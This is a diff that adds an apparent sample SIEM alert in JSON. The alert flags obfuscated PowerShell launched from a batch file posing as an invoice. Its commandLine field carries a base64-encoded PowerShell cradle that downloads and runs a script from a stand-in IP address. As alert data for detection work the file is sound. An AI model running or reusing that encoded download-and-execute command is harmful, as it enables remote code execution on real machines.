@@ -1,0 +1,41 @@
+{
+  "timestamp": "2026-10-29T14:30:15.000+0700",
+  "rule": {
+    "level": 10,
+    "description": "Defense Evasion: PowerShell execution with Encoded/Obfuscated Command Line",
+    "id": "100301",
+    "mitre": {
+      "id": ["T1027", "T1059.001"],
+      "tactic": ["Defense Evasion", "Execution"]
+    }
+  },
+  "agent": {
+    "id": "002",
+    "name": "WIN10-WORKSTATION",
+    "ip": "192.168.1.150"
+  },
+  "data": {
+    "win": {
+      "system": {
+        "eventID": "1",
+        "channel": "Microsoft-Windows-Sysmon/Operational",
+        "computer": "WIN10-WORKSTATION.corp.local"
+      },
+      "eventdata": {
+        "utcTime": "2026-10-29 07:30:15.120",
+        "processGuid": "{8d5a6a32-1234-5678-abcd-ef0123456789}",
+        "processId": "4892",
+        "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "originalFileName": "powershell.exe",
+        "commandLine": "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADgALgA1ADEALgAxADAAMAAuADIAMwAvAGIAZQBhAGMAbwBuAC4AcABzADEAJwApAA==",
+        "currentDirectory": "C:\\Users\\victim_user\\Downloads\\",
+        "user": "CORP\\victim_user",
+        "parentProcessId": "3412",
+        "parentImage": "C:\\Windows\\System32\\cmd.exe",
+        "parentCommandLine": "cmd.exe /c start_invoice.bat",
+        "hashes": "SHA256=DE96A6E699FE5EDDE18877540EEA69C4B7FE7BFF846066FAFFCA51F26FFC932D"
+      }
+    }
+  }
+}
+
